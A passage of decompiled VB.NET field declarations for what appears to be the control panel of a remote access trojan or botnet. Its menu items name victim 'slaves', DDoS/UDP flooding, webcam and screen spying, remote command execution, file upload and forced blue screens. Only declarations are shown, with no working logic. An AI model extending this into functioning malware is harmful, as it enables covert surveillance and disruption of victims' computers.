        Private _ColumnHeader1 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader2")> _
        Private _ColumnHeader2 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader3")> _
        Private _ColumnHeader3 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader4")> _
        Private _ColumnHeader4 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader5")> _
        Private _ColumnHeader5 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader6")> _
        Private _ColumnHeader6 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader7")> _
        Private _ColumnHeader7 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader8")> _
        Private _ColumnHeader8 As ColumnHeader
        <AccessedThroughProperty("ComputerManegerToolStripMenuItem")> _
        Private _ComputerManegerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Conected")> _
        Private _Conected As Label
        <AccessedThroughProperty("ContextMenuStrip1")> _
        Private _ContextMenuStrip1 As ContextMenuStrip
        <AccessedThroughProperty("CrashComputerToolStripMenuItem")> _
        Private _CrashComputerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("CreditsToolStripMenuItem")> _
        Private _CreditsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DdoSToolStripMenuItem")> _
        Private _DdoSToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DeliteAllToolStripMenuItem")> _
        Private _DeliteAllToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DeliteSlaveToolStripMenuItem")> _
        Private _DeliteSlaveToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DonatePaypallToolStripMenuItem")> _
        Private _DonatePaypallToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ExtrainfoLabel")> _
        Private _ExtrainfoLabel As Label
        <AccessedThroughProperty("FilesToolStripMenuItem")> _
        Private _FilesToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("FunThingsToolStripMenuItem")> _
        Private _FunThingsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("GetActiveWindowToolStripMenuItem")> _
        Private _GetActiveWindowToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("GetProceToolStripMenuItem")> _
        Private _GetProceToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("HelpTorCTToolStripMenuItem")> _
        Private _HelpTorCTToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("HostText")> _
        Private _HostText As Label
        <AccessedThroughProperty("ImageList1")> _
        Private _ImageList1 As ImageList
        <AccessedThroughProperty("KillProcessToolStripMenuItem")> _
        Private _KillProcessToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("KillProcessToolStripMenuItem1")> _
        Private _KillProcessToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("Label3")> _
        Private _Label3 As Label
        <AccessedThroughProperty("ListView1")> _
        Private _ListView1 As ListView
        <AccessedThroughProperty("MenuStrip1")> _
        Private _MenuStrip1 As MenuStrip
        <AccessedThroughProperty("MsgboxToolStripMenuItem")> _
        Private _MsgboxToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OpenAdflyLinksGoogleToolStripMenuItem")> _
        Private _OpenAdflyLinksGoogleToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OpenAdflyToolStripMenuItem")> _
        Private _OpenAdflyToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OpenCDDToolStripMenuItem")> _
        Private _OpenCDDToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OpenChatToolStripMenuItem")> _
        Private _OpenChatToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OpenNotepadToolStripMenuItem")> _
        Private _OpenNotepadToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OpenOtherPPCToolStripMenuItem")> _
        Private _OpenOtherPPCToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("OtherToolStripMenuItem")> _
        Private _OtherToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Panel1")> _
        Private _Panel1 As Panel
        <AccessedThroughProperty("Panel2")> _
        Private _Panel2 As Panel
        <AccessedThroughProperty("Panel3")> _
        Private _Panel3 As Panel
        <AccessedThroughProperty("Panel4")> _
        Private _Panel4 As Panel
        <AccessedThroughProperty("Panel5")> _
        Private _Panel5 As Panel
        <AccessedThroughProperty("Panel6")> _
        Private _Panel6 As Panel
        <AccessedThroughProperty("phpv")> _
        Private _phpv As Label
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("ProcessViewerToolStripMenuItem")> _
        Private _ProcessViewerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RefreshSlavesToolStripMenuItem1")> _
        Private _RefreshSlavesToolStripMenuItem1 As ToolStripMenuItem
        <AccessedThroughProperty("RestartClientToolStripMenuItem")> _
        Private _RestartClientToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RestartComputerToolStripMenuItem")> _
        Private _RestartComputerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RichTextBox1")> _
        Private _RichTextBox1 As RichTextBox
        <AccessedThroughProperty("RunBatchScriptCMDToolStripMenuItem")> _
        Private _RunBatchScriptCMDToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RunCmdToolStripMenuItem")> _
        Private _RunCmdToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("RunThingsToolStripMenuItem")> _
        Private _RunThingsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ScreenToolStripMenuItem")> _
        Private _ScreenToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SelectAllSlavesToolStripMenuItem")> _
        Private _SelectAllSlavesToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SelectedV")> _
        Private _SelectedV As Label
        <AccessedThroughProperty("ServerSettingsToolStripMenuItem")> _
        Private _ServerSettingsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ShowClientLogsToolStripMenuItem")> _
        Private _ShowClientLogsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ShowImageToolStripMenuItem")> _
        Private _ShowImageToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ShutdownComputerToolStripMenuItem")> _
        Private _ShutdownComputerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SlavesToolStripMenuItem")> _
        Private _SlavesToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SleepToolStripMenuItem")> _
        Private _SleepToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SOnline")> _
        Private _SOnline As Label
        <AccessedThroughProperty("StartWebsiteToolStripMenuItem")> _
        Private _StartWebsiteToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("TalkComputerToolStripMenuItem")> _
        Private _TalkComputerToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Timer1")> _
        Private _Timer1 As Timer
        <AccessedThroughProperty("Timer2")> _
        Private _Timer2 As Timer
        <AccessedThroughProperty("Timer3")> _
        Private _Timer3 As Timer
        <AccessedThroughProperty("ToolStripSeparator1")> _
        Private _ToolStripSeparator1 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator2")> _
        Private _ToolStripSeparator2 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator3")> _
        Private _ToolStripSeparator3 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator4")> _
        Private _ToolStripSeparator4 As ToolStripSeparator
        <AccessedThroughProperty("TutorialsToolStripMenuItem")> _
        Private _TutorialsToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UDPToolStripMenuItem")> _
        Private _UDPToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UnclosebleBlackScreenToolStripMenuItem")> _
        Private _UnclosebleBlackScreenToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UnclosebleBlueScreenToolStripMenuItem")> _
        Private _UnclosebleBlueScreenToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UpdToolStripMenuItem")> _
        Private _UpdToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UploadFileToSlaveToolStripMenuItem")> _
        Private _UploadFileToSlaveToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("VieuwScreenToolStripMenuItem")> _
        Private _VieuwScreenToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("VieuwWebcamToolStripMenuItem")> _
        Private _VieuwWebcamToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ViewSlaveFilesToolStripMenuItem")> _
        Private _ViewSlaveFilesToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("WakeToolStripMenuItem")> _
        Private _WakeToolStripMenuItem As ToolStripMenuItem
        Private a As String
        Private b As String()
        Private CheckServer As WebClient
        Private CheckSlaves As WebClient
        Private components As IContainer
        Private ConectTorCT As WebClient
        Public CS As String
        Public HostName As String
        Private InputVlaue As String
        Private L As String()
        Private phpver As Integer
        Private r As String()
        Private RefreshSlaves As Integer
        Private SendCommand As WebClient
        Private SOstring As String
        Public Strvictem As String
        Public WitchViewSW As Integer
    End Class
End Namespace

